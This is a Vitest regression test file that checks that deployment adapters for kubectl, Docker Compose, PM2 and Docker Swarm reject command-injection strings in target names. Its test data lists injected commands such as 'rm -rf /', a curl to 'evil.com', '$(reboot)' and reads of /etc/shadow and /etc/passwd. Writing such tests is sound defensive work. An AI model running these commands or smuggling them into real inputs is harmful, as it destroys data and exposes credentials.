import { describe, expect, it } from "vitest";
import { KubectlAdapter } from "../../src/adapters/kubectl.js";
import { DockerComposeAdapter } from "../../src/adapters/dockerCompose.js";
import { PM2Adapter } from "../../src/adapters/pm2.js";
import { DockerSwarmAdapter } from "../../src/adapters/dockerSwarm.js";
import { assertSafeTarget } from "../../src/adapters/execFn.js";

describe("Regression: Standalone Adapter Target Sanitization & Command Injection Prevention", () => {
  const dangerousInputs = [
    "service; rm -rf /",
    "deployment && curl http://evil.com",
    "app | bash",
    "$(reboot)",
    "`touch /tmp/pwned`",
    "service > /dev/null",
    "service\ncat /etc/shadow",
  ];

  it("assertSafeTarget rejects dangerous shell characters", () => {
    for (const input of dangerousInputs) {
      expect(() => assertSafeTarget(input)).toThrow(/contains illegal shell characters/);
    }
  });

  it("assertSafeTarget accepts safe alphanumeric and path identifiers", () => {
    const safeInputs = [
      "production-api",
      "my_service_v1",
      "frontend.web",
      "org/repo:v1.0.0",
      "kube-system",
    ];
    for (const input of safeInputs) {
      expect(() => assertSafeTarget(input)).not.toThrow();
    }
  });

  it("KubectlAdapter rejects malicious target and namespace", async () => {
    expect(() => new KubectlAdapter({ namespace: "default; rm -rf /" })).toThrow(/contains illegal shell characters/);

    const adapter = new KubectlAdapter();
    await expect(adapter.checkHealth("my-app; pkill node")).rejects.toThrow(/contains illegal shell characters/);
    await expect(adapter.rollback("my-app && echo pwned")).rejects.toThrow(/contains illegal shell characters/);
  });

  it("DockerComposeAdapter rejects malicious target, previousImageTag, and composeFile", async () => {
    expect(() => new DockerComposeAdapter("v1.0.0; rm -rf /")).toThrow(/contains illegal shell characters/);
    expect(() => new DockerComposeAdapter("v1.0.0", { composeFile: "compose.yml; reboot" })).toThrow(/contains illegal shell characters/);

    const adapter = new DockerComposeAdapter("v1.0.0");
    await expect(adapter.checkHealth("web; ls")).rejects.toThrow(/contains illegal shell characters/);
    await expect(adapter.rollback("web | bash")).rejects.toThrow(/contains illegal shell characters/);
  });

  it("PM2Adapter rejects malicious target, previousSha, and directories", async () => {
    expect(() => new PM2Adapter("sha123; rm -rf /")).toThrow(/contains illegal shell characters/);
    expect(() => new PM2Adapter("sha123", { releasesRoot: "/var/releases; reboot" })).toThrow(/contains illegal shell characters/);

    const adapter = new PM2Adapter("sha123");
    await expect(adapter.checkHealth("api && ls")).rejects.toThrow(/contains illegal shell characters/);
    await expect(adapter.rollback("api; cat /etc/passwd")).rejects.toThrow(/contains illegal shell characters/);
  });

  it("DockerSwarmAdapter rejects malicious target", async () => {
    const adapter = new DockerSwarmAdapter();
    await expect(adapter.checkHealth("swarm-service; rm -rf /")).rejects.toThrow(/contains illegal shell characters/);
    await expect(adapter.rollback("swarm-service | sh")).rejects.toThrow(/contains illegal shell characters/);
  });
});
